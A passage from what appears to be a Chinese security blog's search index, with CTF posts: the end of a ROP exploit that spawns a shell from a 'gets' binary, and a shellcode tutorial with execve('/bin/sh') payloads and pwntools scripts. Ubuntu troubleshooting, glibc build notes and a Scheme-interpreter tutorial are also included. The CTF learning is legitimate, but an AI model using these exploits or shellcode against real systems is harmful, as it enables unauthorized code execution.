'amd64'local = 0if local: p = remote('127.0.0.1', 4000) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('10.21.13.69', 10010) libc = ELF('libc.so.6')elf = ELF('./gets')g = lambda x: next(elf.search(asm(x)))system_offset = libc.symbols['system']gets_offset = libc.symbols['gets']offset = system_offset - gets_offsetif offset &lt; 0: offset &amp;= 0xffffffffgets_plt = elf.plt['gets']gets_got = elf.got['gets']libc_csu_init = elf.symbols['__libc_csu_init']pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')pop_rbp_ret = g('pop rbp ; ret')pop_rdi_ret = g('pop rdi ; ret')pop_r15_ret = g('pop r15 ; ret')pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')add_ebx_esi_ret = g('add ebx, esi ; ret')leave_ret = g('leave ; ret')call_at_r12 = g('call QWORD PTR [r12+rbx*8]')# gdb.attach(p)bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800rop1 = [ pop_rdi_ret, buf1, gets_plt, # rop2 pop_rdi_ret, buf2, gets_plt, # rop4 pop_rdi_ret, buf3, gets_plt, # rop5 pop_rdi_ret, buf4, gets_plt, # rop7 pop_rdi_ret, buf5, gets_plt, # rop9 pop_rdi_ret, buf6, gets_plt, # rop10 pop_rdi_ret, buf7, gets_plt, # rop13 pop_rbp_ret, buf1 - 8, leave_ret]rop2 = [ # buf1 pop_rdi_ret, gets_got + 24, gets_plt, # rop3 pop_rbp_ret, buf2 - 8, pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24 leave_ret]rop4 = [ # buf2 libc_csu_init, pop_rbp_ret, buf3 - 8, leave_ret]rop5 = [ # buf3 pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1 pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2 pop_rbp_ret, buf2 - 24 - 8, leave_ret]rop6_1 = [ # buf2 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop6_2 = [ # buf2 + 32 pop_rsi_r15_ret, offset, 8, add_ebx_esi_ret, # 0xdeadbeef, libc_csu_init, pop_rbp_ret, buf4 - 8, leave_ret]rop7 = [ # buf4 pop_rdi_ret, gets_got + 28, gets_plt, # rop8 pop_rbp_ret, buf5 - 8, pop_rsp_r13_r14_r15_ret, gets_got + 4]rop8 = [ # gets_got + 28 leave_ret]rop9 = [ # buf5 libc_csu_init, pop_rbp_ret, buf6 - 8, leave_ret]rop10 = [ # buf6 pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1 pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2 pop_rbp_ret, buf5 - 24 - 8, leave_ret]rop11_1 = [ # buf5 - 24 pop_rbx_rbp_r12_r13_r14_r15_ret]rop11_2 = [ # buf5 + 32 pop_rdi_ret, buf2 + 68, gets_plt, # rop12 pop_rbp_ret, buf2 + 68 - 8, leave_ret]rop12 = [ # buf2 + 164 libc_csu_init, pop_rbp_ret, buf7 - 8, leave_ret]rop13 = [ pop_rdi_ret, buf8, gets_plt, # shell command pop_rdi_ret, buf8, pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0, call_at_r12]payload = ( 'A' * 24 + ''.join(map(p64, rop1)) + '\\n' + ''.join(map(p64, rop2)) + '\\n' + ''.join(map(p64, rop4)) + '\\n' + ''.join(map(p64, rop5)) + '\\n' + ''.join(map(p64, rop7)) + '\\n' + ''.join(map(p64, rop9)) + '\\n' + ''.join(map(p64, rop10)) + '\\n' + ''.join(map(p64, rop13)) + '\\n' + ''.join(map(p64, rop3))[:-1] + '\\n' + ''.join(map(p64, rop6_1))[:-1] + '\\n' + ''.join(map(p64, rop6_2)) + '\\n' + ''.join(map(p64, rop8)) + '\\n' + ''.join(map(p64, rop11_1))[:-1] + '\\n' + ''.join(map(p64, rop11_2)) + '\\n' + ''.join(map(p64, rop12)) + '\\n' + 'sh\\n')p.send(payload)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"解决VMware下Ubuntu的一些问题","slug":"解决VMware下Ubuntu的一些问题","date":"2019-03-06T02:57:51.000Z","updated":"2019-03-18T08:31:52.272Z","comments":true,"path":"2019/03/06/解决VMware下Ubuntu的一些问题/","link":"","permalink":"https://qianfei11.github.io/2019/03/06/解决VMware下Ubuntu的一些问题/","excerpt":"记录一些在虚拟机上的问题。","text":"记录一些在虚拟机上的问题。 0x0 更新出错（Sub-process returned an error code）装了个优麒麟（Ubuntu Kylin），更新的时候居然报错了。 在sudo apt-get update后出现： 1234Aborted (core dumped)Reading package lists... DoneE: Problem executing scripts APT::Update::Post-Invoke-Success 'if /usr/bin/test -w /var/cache/app-info -a -e /usr/bin/appstreamcli; then appstreamcli refresh &gt; /dev/null; fi'E: Sub-process returned an error code 大概跟一个安装包libappstream3有关，remove掉就行了： 1sudo apt-get remove libappstream3 0x1 无法显示图形化界面12**The system is running in low-graphics mode**Your screen, graphics cards, and input device settings could not be detected correctly. You will need to configure these yourself. 装一下vm桌面，再更新一下磁盘： 12345sudo apt-get updatesudo apt-get install open-vm-toolssudo apt-get install open-vm-tools-desktopsudo rebootsudo apt-get dist-upgrade 0x2 无法开机1intel_rapl: no valid rapl domains found in package 0 在vmware的.vmx文件中添加paevm = &quot;TRUE&quot;。如果还不能解决，说明电脑的cpu不支持PAE。直接在文件/etc/modprobe.d/blacklist.conf中添加blacklist intel_rapl后重启。 0x3 开机显示异常1piix4_smbus ****host smbus controller not enabled 在文件/etc/modprobe.d/blacklist.conf中添加blacklist piix4_smbus后重启。 0x4 开启后跳出提示框（Could not apply the stored configuration for monitors）这个弹出窗口的意思是，不能应用当前显示器的设置，也就是显示器的设置有错误。在关机的时候，系统会保存上一次的设置，在$HOME/.config下生成一个monitors.xml的文件。只需要把这个文件删除即可： 1sudo rm -rf ~/.config/monitors.xml 参考网站https://blog.csdn.net/xiaxuesong666/article/details/77072770https://askubuntu.com/questions/998318/the-system-is-running-in-low-graphics-mode-error-after-installing-vmware-toolshttp://www.it610.com/article/3346432.htmhttps://blog.csdn.net/think_embed/article/details/8805510","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://qianfei11.github.io/tags/linux/"},{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"Ubuntu16.04下编译libc2.23","slug":"Ubuntu16-04下编译libc2-23","date":"2019-03-04T13:31:41.000Z","updated":"2019-03-06T04:50:30.262Z","comments":true,"path":"2019/03/04/Ubuntu16-04下编译libc2-23/","link":"","permalink":"https://qianfei11.github.io/2019/03/04/Ubuntu16-04下编译libc2-23/","excerpt":"为了更好地调试堆，需要自己编译一个带symbol的libc。","text":"为了更好地调试堆，需要自己编译一个带symbol的libc。 环境和工具 Ubuntu16.04 glibc-2.23.tar.gz 12assassinq@ubuntu ~/glibc-2.23/build$ uname -a Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 准备工作从ftp上把glibc下载下来，解压后新建一个build文件夹： 123cd &amp;&amp; wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz \\ tar -xvf glibc-2.23.tar.gz &amp;&amp; cd glibc-2.23 \\ mkdir build &amp;&amp; cd build # mkdir build32 &amp;&amp; cd build32 编译过程中的挖坑和填坑在build文件夹下configure，并且加上一些必要的参数使得编译时加上symbol，并且指定输出文件夹：（转自2016年winesap的社课） 123456789# x64CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\ CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\ ../configure --prefix=/path/to/install# x32CC=\"gcc -m32\" CXX=\"g++ -m32\" \\ CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\ CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\" \\ ../configure --prefix=/path/to/install --host=i686-linux-gnu 如果没有任何意外的话就能直接make &amp;&amp; make install编译了。下面记录一下遇到的几个坑。（感谢n132大哥的博客） 0x0 某些安装包缺失configure的时候提示有些安装包缺失，不能生成Makefile： 123configure: error: *** These critical programs are missing or too old: gawk*** Check the INSTALL file for required versions. 根据提示安装一下即可： 1sudo apt-get update &amp;&amp; sudo apt-get install gawk 0x1 警告提示1234567891011121314In file included from regex.c:67:0:regexec.c: In function ‘check_node_accept_bytes’:regexec.c:3856:29: error: ‘extra’ may be used uninitialized in this function [-Werror=maybe-uninitialized] const unsigned char *coll_sym = extra + cset-&gt;coll_syms[i]; ^cc1: all warnings being treated as errors../o-iterator.mk:9: recipe for target &apos;/home/assassinq/glibc-2.23/build/posix/regex.o&apos; failedmake[2]: *** [/home/assassinq/glibc-2.23/build/posix/regex.o] Error 1make[2]: Leaving directory &apos;/home/assassinq/glibc-2.23/posix&apos;Makefile:214: recipe for target &apos;posix/subdir_lib&apos; failedmake[1]: *** [posix/subdir_lib] Error 2make[1]: Leaving directory &apos;/home/assassinq/glibc-2.23&apos;Makefile:9: recipe for target &apos;all&apos; failedmake: *** [all] Error 2 cc1: all warnings being treated as errors是因为设置了警告提示，这里可以回到之前configure的时候，CFLAGS新增加一个参数-Wno-error来去除警告： 1CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og -Wno-error\" 0x2 ld.so.conf缺失12/home/assassinq/glibc-2.23/build/elf/ldconfig: Warning: ignoring configuration file that cannot be opened: /home/assassinq/glibc-2.23/64/etc/ld.so.conf: No such file or directorymake[1]: Leaving directory &apos;/home/assassinq/glibc-2.23&apos; 这里只需要直接touch一个新文件即可： 1cd ../64/etc &amp;&amp; sudo touch ld.so.conf 调试记录一下调_dl_runtime_resolve的Makefile： 123all: aa: a.c gcc a.c -o a -Wl, -dynamic-linker /path/to/install/lib/ld-2.23.so -g 参考网站https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/https://www.youtube.com/watch?v=wsIvqd9YqTI&amp;feature=share","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://qianfei11.github.io/tags/linux/"}]},{"title":"Shellcode Tricks","slug":"【未完成】Shellcode-Tricks","date":"2019-03-02T11:05:59.000Z","updated":"2019-03-03T03:19:57.508Z","comments":true,"path":"2019/03/02/【未完成】Shellcode-Tricks/","link":"","permalink":"https://qianfei11.github.io/2019/03/02/【未完成】Shellcode-Tricks/","excerpt":"The Splendid Shellcode.","text":"The Splendid Shellcode. Shellcode是一串可以直接被执行的机器码，可以用来获得Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。 可以控制程序执行流，可以控制一定的data； 利用mprotect()或者_dl_make_stack_executable()改写某些区域的porc再执行。 关于System Call： 1sys_execve( const char *filename, char *const argv[], char *const envp[] ); 目标： 1execve(\"/bin/sh\", 0, 0); System Call x86： eax ebx ecx edx else 0xb addr of “/bin/sh” 0 0 int 0x80 System Call x64： rax rdi rsi rdx else 59 addr of “/bin/sh” 0 0 syscall Basic Shellcode最基础的shellcode，对输入的长度没有做任何限制。 shellcodeSource Code： 12345678910// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x20]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 0x20); ptr = buf; ptr();&#125; push字符串&quot;/bin/sh&quot;，此时esp指向字符串，即直接把esp的值赋给ebx即可。&quot;/bin/sh&quot;的值可以在gdb调试中searchmem /bin/sh得到。Shellcode的长度为29。 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'i386'sh = asm(''' mov eax, 0xb mov ecx, 0 mov edx, 0 push 0x68732f push 0x6e69622f mov ebx, esp int 0x80''')info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x20))p.interactive() shellcode64Source Code： 12345678910// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x40]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 0x40); ptr = buf; ptr();&#125; 64位下不能直接push值，需要通过寄存器push。Shellcode的长度为37 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'amd64'sh = asm(''' mov rax, 59 mov rsi, 0 mov rdx, 0 mov rdi, 0x68732f6e69622f push rdi mov rdi, rsp syscall''')info(disasm(sh))info(len(sh))# gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x40))p.interactive() Baby Shellcode对接受的字符串长度做了一点限制，需要通过一些Tricks来缩短Shellcode的长度。 shellcode_20Source Code： 12345678910// gcc main.c -m32 -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x20]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 20); ptr = buf; ptr();&#125; 32位下，mov ecx, 0是5个字节，而xor ecx, ecx只有2个字节，两者同样是给寄存器清零，后者可以省去3个字节。mov eax, 0xb同样需要5个字节，而在eax为0的情况下，我们只需要mov al, 0xb，只需要2个字节。mul ebx需要2个字节，其作用是将eax中值与ebx相乘，所得结果高位存在edx，低位存在eax。在调试中我们发现ebx的值为零，此时使用乘法指令可以直接使eax和edx的值变为0，可以直接对al赋值，同时不用再对edx清零。最终Shellcode的长度缩短为20字节。 Exploit： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'i386'sh = asm(''' mul ebx mov al, 0xb xor ecx, ecx push 0x0068732f push 0x6e69622f mov ebx, esp int 0x80''')info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x20, '\\x00'))p.interactive() shellcode64_22Source Code： 12345678910// gcc main.c -z execstack -o main#include &lt;stdio.h&gt;int main() &#123; void (*ptr)(); char buf[0x40]; puts(\"shellcode&gt;&gt;\"); read(0, buf, 22); ptr = buf; ptr();&#125; 调试中可以发现rax和rbx的值为0，我们可以把7个字节的mov rax, 59缩短为2个字节的mov al, 59。同时清零rdx和rsi的工作可以通过xor来缩短成3个字节。然而，通过观察发现，64位下只能通过寄存器的push只需要1个字节。如果用push和pop，即push rbx ; pop rsi只需要2个字节。后面对rdi的赋值也可以通过同样的方式达到目的。最终Shellcode的长度缩短为21字节。 Exploit： 123456789101112131415161718192021#!/usr/bin/env pythonfrom pwn import *p = process('./main')context.arch = 'amd64'sh = asm(''' mov al, 59 push rbx push rbx pop rsi pop rdx mov rdi, 0x68732f6e69622f push rdi push rsp pop rdi syscall''')info(disasm(sh))info(len(sh))gdb.attach(p)p.sendafter('shellcode&gt;&gt;\\n', sh.ljust(0x40))p.interactive() Child ShellcodeorwDeath NoteAdult ShellcodeAlive NoteHell ShellcodeMnO2","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"【转】怎样写一个解释器","slug":"【转】怎样写一个解释器","date":"2019-02-28T05:34:20.000Z","updated":"2019-03-12T04:19:36.791Z","comments":true,"path":"2019/02/28/【转】怎样写一个解释器/","link":"","permalink":"https://qianfei11.github.io/2019/02/28/【转】怎样写一个解释器/","excerpt":"转自王垠老师的博客","text":"转自王垠老师的博客 怎样写一个解释器写一个解释器，通常是设计和实现程序语言的第一步。解释器是简单却又深奥的东西，以至于好多人都不会写，所以我决定写一篇这方面的入门读物。 虽然我试图从最基本的原理讲起，尽量不依赖于其它知识，但这并不是一本编程入门教材。我假设你已经理解 Scheme 语言，以及基本的编程技巧（比如递归）。如果你完全不了解这些，那我建议你读一下 SICP 的第一，二章，或者 HtDP 的前几章，习题可以不做。注意不要读太多书，否则你就回不来了 ;-) 当然你也可以直接读这篇文章，有不懂的地方再去查资料。 实现语言容易犯的一个错误，就是一开头就试图去实现很复杂的语言（比如 JavaScript 或者 Python）。这样你很快就会因为这些语言的复杂性，以及各种历史遗留的设计问题而受到挫折，最后不了了之。学习实现语言，最好是从最简单，最干净的语言开始，迅速写出一个可用的解释器。之后再逐步往里面添加特性，同时保持正确。这样你才能有条不紊地构造出复杂的解释器。 因为这个原因，这篇文章只针对一个很简单的语言，名叫“R2”。它可以作为一个简单的计算器用，还具有变量定义，函数定义和调用等功能。 我们的工具：Racket本文的解释器是用 Scheme 语言实现的。Scheme 有很多的“实现”，这里我用的实现叫做 Racket，它可以在这里免费下载。为了让程序简洁，我用了一点点 Racket 的模式匹配（pattern matching）功能。我对 Scheme 的实现没有特别的偏好，但 Racket 方便易用，适合教学。如果你用其它的 Scheme 实现，可能得自己做一些调整。 Racket 具有宏（macro），所以它其实可以变成很多种语言。如果你之前用过 DrRacket，那它的“语言设置”可能被你改成了 R5RS 之类的。所以如果下面的程序不能运行，你可能需要检查一下 DrRacket 的“语言设置”，把 Language 设置成 “Racket”。 Racket 允许使用方括号而不只是圆括号，所以你可以写这样的代码： 123(let ([x 1] [y 2]) (+ x y)) 方括号跟圆括号可以互换，唯一的要求是方括号必须和方括号匹配。通常我喜欢用方括号来表示“无动作”的数据（比如上面的 [x 1], [y 2]），这样可以跟函数调用和其它具有“动作”的代码，产生“视觉差”。这对于代码的可读性是一个改善，因为到处都是圆括号的话，确实有点太单调，容易打瞌睡。 另外，Racket 程序的最上面都需要加上像 #lang racket 这样的语言选择标记，这样 Racket 才可以知道你想用哪个语言变种。 解释器是什么准备工作就到这里。现在我来谈一下，解释器到底是什么。说白了，解释器跟计算器差不多。解释器是一个函数，你输入一个“表达式”，它就输出一个 “值”，像这样： 比如，你输入表达式 ‘(+ 1 2) ，它就输出值，整数3。表达式是一种“表象”或者“符号”，而值却更加接近“本质”或者“意义”。我们“解释”了符号，得到它的意义，这也许就是为什么它叫做“解释器”。 需要注意的是，表达式是一个数据结构，而不是一个字符串。我们用一种叫“S 表达式”（S-expression）的结构来存储表达式。比如表达式 ‘(+ 1 2) 其实是一个链表（list），它里面的内容是三个符号（symbol）：+, 1 和 2，而不是字符串”(+ 1 2)”。 从 S 表达式这样的“结构化数据”里提取信息，方便又可靠，而从字符串里提取信息，麻烦而且容易出错。Scheme（Lisp）语言里面大量使用结构化数据，少用字符串，这是 Lisp 系统比 Unix 系统先进的地方之一。 从计算理论的角度讲，每个程序都是一台机器的“描述”，而解释器就是在“模拟”这台机器的运转，也就是在进行“计算”。所以从某种意义上讲，解释器就是计算的本质。当然，不同的解释器就会带来不同的计算。 CPU 也是一个解释器，它专门解释执行机器语言。如果你深刻理解了解释器，就可以从本质上看出各种 CPU 的设计为什么是那个样子，它们有什么优缺点，而不只是被动的作为它们的使用者。 抽象语法树（Abstract Syntax Tree）用 S 表达式所表示的代码，本质上是一种叫做“树”（tree）的数据结构。更具体一点，这叫做“抽象语法树”（Abstract Syntax Tree，简称 AST）。下文为了简洁，我们省略掉“抽象”两个字，就叫它“语法树”。 跟普通的树结构一样，语法树里的节点，要么是一个“叶节点”，要么是一颗“子树”。叶节点是不能再细分的“原子”，比如数字，字符串，操作符，变量名。而子树是可以再细分的“结构”，比如算术表达式，函数定义，函数调用，等等。 举个简单的例子，表达式 ‘(* (+ 1 2) (+ 3 4))，就对应如下的语法树结构： 其中，，两个+，1，2，3，4 都是叶节点，而那三个红色节点，都表示子树结构：’(+ 1 2)，’(+ 3 4)，’( (+ 1 2) (+ 3 4))。 树遍历算法在基础的数据结构课程里，我们都学过二叉树的遍历操作，也就是所谓先序遍历，中序遍历和后序遍历。语法树跟二叉树，其实没有很大区别，所以你也可以在它上面进行遍历。解释器的算法，就是在语法树上的一种遍历操作。由于这个渊源关系，我们先来做一个遍历二叉树的练习。做好了之后，我们就可以把这段代码扩展成一个解释器。 这个练习是这样：写出一个函数，名叫tree-sum，它对二叉树进行“求和”，把所有节点里的数加在一起，返回它们的和。举个例子，(tree-sum ‘((1 2) (3 4)))，执行后应该返回 10。注意：这是一颗二叉树，所以不会含有长度超过 2 的子树，你不需要考虑像 ((1 2) (3 4 5)) 这类情况。需要考虑的例子是像这样：(1 2)，(1 (2 3)), ((1 2) 3) ((1 2) (3 4))，…… （为了达到最好的学习效果，你最好试一下写出这个函数再继续往下看。） 好了，希望你得到了跟我差不多的结果。我的代码是这个样子： 12345678910#lang racket(define tree-sum (lambda (exp) (match exp ; 对输入exp进行模式匹配 [(? number? x) x] ; exp是一个数x吗？如果是，那么返回这个数x [`(,e1 ,e2) ; exp是一个含有两棵子树的中间节点吗？ (let ([v1 (tree-sum e1)] ; 递归调用tree-sum自己，对左子树e1求值 [v2 (tree-sum e2)]) ; 递归调用tree-sum自己，对右子树e2求值 (+ v1 v2))]))) ; 返回左右子树结果v1和v2的和 你可以通过以下的例子来测试它的正确性： 12345678(tree-sum &apos;(1 2));; =&gt; 3(tree-sum &apos;(1 (2 3)));; =&gt; 6(tree-sum &apos;((1 2) 3));; =&gt; 6(tree-sum &apos;((1 2) (3 4)));; =&gt; 10 （完整的代码和示例，可以在这里下载。） 这个算法很简单，我们可以把它用文字描述如下： 如果输入 exp 是一个数，那就返回这个数。 否则如果 exp 是像 (,e1 ,e2) 这样的子树，那么分别对 e1 和 e2 递归调用 tree-sum，进行求和，得到 v1 和 v2，然后返回 v1 + v2 的和。你自己写出来的代码，也许用了 if 或者 cond 语句来进行分支，而我的代码里面使用的是 Racket 的模式匹配（match）。这个例子用 if 或者 cond 其实也可以，但我之后要把这代码扩展成一个解释器，所以提前使用了 match。这样跟后面的代码对比的时候，就更容易看出规律来。接下来，我就简单讲一下这个 match 表达式的工作原理。 模式匹配现在不得不插入一点 Racket 的技术细节，如果你已经学会使用 Racket 的模式匹配，可以跳过这一节。你也可以通过阅读 Racket 模式匹配的文档来代替这一节。但我建议你不要读太多文档，因为我接下去只用到很少的模式匹配功能，我把它们都解释如下。 模式匹配的形式一般是这样： 12345(match x [模式 结果] [模式 结果] ... ...) 它先对 x 求值，然后根据值的结构来进行分支。每个分支由两部分组成，左边是一个模式，右边是一个结果。整个 match 语句的语义是这样：从上到下依次考虑，找到第一个可以匹配 x 的值的模式，返回它右边的结果。左边的模式在匹配之后，可能会绑定一些变量，这些变量可以在右边的表达式里使用。 模式匹配是一种分支语句，它在逻辑上就是 Scheme（Lisp） 的 cond 表达式，或者 Java 的嵌套条件语句 if … else if … else …。然而跟条件语句里的“条件”不同，每条 match 语句左边的模式，可以准确而形象地描述数据结构的形状，而且可以在匹配的同时，对结构里的成员进行“绑定”。这样我们可以在右边方便的访问结构成员，而不需要使用访问函数（accessor）或者 foo.x 这样的属性语法（attribute）。而且模式可以有嵌套的子结构，所以它能够一次性的表示复杂的数据结构。 举个实在点的例子。我的代码里用了这样一个 match 表达式： 123456(match exp [(? number? x) x] [`(,e1 ,e2) (let ([v1 (tree-sum e1)] [v2 (tree-sum e2)]) (+ v1 v2))]) 第二行里面的 ‘(,e1 ,e2) 是一个模式（pattern），它被用来匹配 exp 的值。如果 exp 是 ‘(1 2)，那么它与’(,e1 ,e2)匹配的时候，就会把 e1 绑定到 ‘1，把 e2 绑定到 ‘2。这是因为它们结构相同： 12`(,e1 ,e2)&apos;( 1 2) 说白了，模式就是一个可以含有“名字”（像 e1 和 e2）的结构，像 ‘(,e1 ,e2)。我们拿这个带有名字的结构，去匹配实际数据，像 ‘(1 2)。当它们一一对应之后，这些名字就被绑定到数据里对应位置的值。 第一行的“模式”比较特殊，(? number? x) 表示的，其实是一个普通的条件判断，相当于 (number? exp)，如果这个条件成立，那么它把 exp 的值绑定到 x，这样右边就可以用 x 来指代 exp。对于无法细分的结构（比如数字，布尔值），你只能用这种方式来“匹配”。看起来有点奇怪，不过习惯了就好了。 模式匹配对解释器和编译器的书写相当有用，因为程序的语法树往往具有嵌套的结构。不用模式匹配的话，往往要写冗长，复杂，不直观的代码，才能描述出期望的结构。而且由于结构的嵌套比较深，很容易漏掉边界情况，造成错误。模式匹配可以直观的描述期望的结构，避免漏掉边界情况，而且可以方便的访问结构成员。 由于这个原因，很多源于 ML 的语言（比如 OCaml，Haskell）都有模式匹配的功能。因为 ML（Meta-Language）原来设计的用途，就是用来实现程序语言的。Racket 的模式匹配也是部分受了 ML 的启发，实际上它们的原理是一模一样的。 好了，树遍历的练习就做到这里。然而这跟解释器有什么关系呢？下面我们只把它改一下，就可以得到一个简单的解释器。 一个计算器计算器也是一种解释器，只不过它只能处理算术表达式。我们的下一个目标，就是写出一个计算器。如果你给它 ‘(* (+ 1 2) (+ 3 4))，它就输出 21。可不要小看这个计算器，稍后我们把它稍加改造，就可以得到一个更多功能的解释器。 上面的代码里，我们利用递归遍历，对树里的数字求和。那段代码里，其实已经隐藏了一个解释器的框架。你观察一下，一个算术表达式 ‘( (+ 1 2) (+ 3 4))，跟二叉树 ‘((1 2) (3 4)) 有什么不同？发现没有，这个算术表达式比起二叉树，只不过在每个子树结构里多出了一个操作符：一个 和两个 + 。它不再是一棵二叉树，而是一种更通用的树结构。 这点区别，也就带来了二叉树求和与解释器算法的区别。对二叉树进行求和的时候，在每个子树节点，我们都做加法。而对表达式进行解释的时候，在每一个子树节点，我们不一定进行加法。根据子树的“操作符”不同，我们可能会选择加，减，乘，除四种操作。 好了，下面就是这个计算器的代码。它接受一个表达式，输出一个数字作为结果。 1234567891011121314#lang racket ; 声明用 Racket 语言(define calc (lambda (exp) (match exp ; 分支匹配：表达式的两种情况 [(? number? x) x] ; 是数字，直接返回 [`(,op ,e1 ,e2) ; 匹配提取操作符op和两个操作数e1,e2 (let ([v1 (calc e1)] ; 递归调用 calc 自己，得到 e1 的值 [v2 (calc e2)]) ; 递归调用 calc 自己，得到 e2 的值 (match op ; 分支匹配：操作符 op 的 4 种情况 [&apos;+ (+ v1 v2)] ; 如果是加号，输出结果为 (+ v1 v2) [&apos;- (- v1 v2)] ; 如果是减号，乘号，除号，相似的处理 [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]))]))) 你可以得到如下的结果： 123456(calc &apos;(+ 1 2));; =&gt; 3(calc &apos;(* 2 3));; =&gt; 6(calc &apos;(* (+ 1 2) (+ 3 4)));; =&gt; 21 （完整的代码和示例，可以在这里下载。） 跟之前的二叉树求和代码比较一下，你会发现它们惊人的相似，因为解释器本来就是一个树遍历算法。不过你发现它们有什么不同吗？它们的不同点在于： 算术表达式的模式里面，多出了一个“操作符”（op）叶节点：(,op ,e1 ,e2) 对子树 e1 和 e2 分别求值之后，我们不是返回 (+ v1 v2)，而是根据 op 的不同，返回不同的结果： 12345(match op [&apos;+ (+ v1 v2)] [&apos;- (- v1 v2)] [&apos;* (* v1 v2)] [&apos;/ (/ v1 v2)]) 最后你发现，一个算术表达式的解释器，不过是一个稍加扩展的树遍历算法。 R2：一个很小的程序语言实现了一个计算器，现在让我们过渡到一种更强大的语言。为了方便称呼，我给它起了一个萌萌哒名字，叫 R2。R2 比起之前的计算器，只多出四个元素，它们分别是：变量，函数，绑定，调用。再加上之前介绍的算术操作，我们就得到一个很简单的程序语言，它只有5种不同的构造。用 Scheme 的语法，这5种构造看起来就像这样： 变量：x 函数：(lambda (x) e) 绑定：(let ([x e1]) e2) 调用：(e1 e2) 算术：(• e2 e2)（其中，• 是一个算术操作符，可以选择 +, -, *, / 其中之一） 一般程序语言还有很多其它构造，可是一开头就试图去实现所有那些，只会让人糊涂。最好是把这少数几个东西搞清楚，确保它们正确之后，才慢慢加入其它元素。 这些构造的语义，跟 Scheme 里面的同名构造几乎一模一样。如果你不清楚什么是”绑定“，那你可以把它看成是普通语言里的”变量声明“。 需要注意的是，跟一般语言不同，我们的函数只接受一个参数。这不是一个严重的限制，因为在我们的语言里，函数可以被作为值传递，也就是所谓“first-class function”。所以你可以用嵌套的函数定义来表示有两个以上参数的函数。 举个例子， (lambda (x) (lambda (y) (+ x y))) 是个嵌套的函数定义，它也可以被看成是有两个参数（x 和 y）的函数，这个函数返回 x 和 y 的和。当这样的函数被调用的时候，需要两层调用，就像这样： 12(((lambda (x) (lambda (y) (+ x y))) 1) 2);; =&gt; 3 这种做法在PL术语里面，叫做咖喱（currying）。看起来啰嗦，但这样我们的解释器可以很简单。等我们理解了基本的解释器，再实现真正的多参数函数也不迟。 另外，我们的绑定语法 (let ([x e1]) e2)，比起 Scheme 的绑定也有一些局限。我们的 let 只能绑定一个变量，而 Scheme 可以绑定多个，像这样 (let ([x 1] [y 2]) (+ x y))。这也不是一个严重的限制，因为我们可以啰嗦一点，用嵌套的 let 绑定： 123(let ([x 1]) (let ([y 2]) (+ x y))) R2 的解释器下面是我们今天要完成的解释器，它可以运行一个 R2 程序。你可以先留意一下各部分的注释。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#lang racket;;; 以下三个定义 env0, ext-env, lookup 是对环境（environment）的基本操作：;; 空环境(define env0 &apos;());; 扩展。对环境 env 进行扩展，把 x 映射到 v，得到一个新的环境(define ext-env (lambda (x v env) (cons `(,x . ,v) env)));; 查找。在环境中 env 中查找 x 的值。如果没找到就返回 #f(define lookup (lambda (x env) (let ([p (assq x env)]) (cond [(not p) #f] [else (cdr p)])))) ;; 闭包的数据结构定义，包含一个函数定义 f 和它定义时所在的环境(struct Closure (f env));; 解释器的递归定义（接受两个参数，表达式 exp 和环境 env）;; 共 5 